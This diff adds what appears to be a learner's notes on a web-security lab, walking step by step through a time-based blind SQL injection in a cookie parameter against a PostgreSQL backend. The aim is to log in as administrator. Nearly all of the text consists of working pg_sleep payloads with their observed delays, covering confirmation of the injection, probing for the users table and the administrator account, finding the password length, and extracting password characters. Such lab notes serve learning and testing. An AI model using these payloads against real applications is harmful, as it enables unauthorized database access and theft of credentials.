@@ -1,0 +1,43 @@
+Perform and retrieve data with a time-based SQLi
+
+info:
+    - users table
+    - password columns
+    - username columns
+    - The cookie id is the vulnerable parameter
+
+Objective:
+    - Log in as administrator
+
+---------------------------------------------------------------
+
+STEP1: Prove that the parameter in vuln to a time-based SQLi
+
+!Payload: '||(SELECT+pg_sleep(10))--
+ output: Request in tempo 10s
+
+----------------------------------------------------------------
+
+STEP2: Determine if the users table exist:
+
+!Payload: '||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'
+output: 20s Delay !?
+
+----------------------------------------------------------------
+
+STEP3: Determine if the administrator exist in the user columns:
+
+!Payload: '||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'
+output: 10s Delay
+
+-----------------------------------------------------------------
+
+STEP4: Determine the Length of the password:
+!Payload: '||(SELECT CASE WHEN LENGTH(password)>1 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')||'
+output: The Length of the password is 20
+
+-----------------------------------------------------------------
+
+STEP5: Determine the first letter of the admin cred:
+!Payload: '||(SELECT CASE WHEN substring(password,1,1) = 'a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')||'
+output: 's'
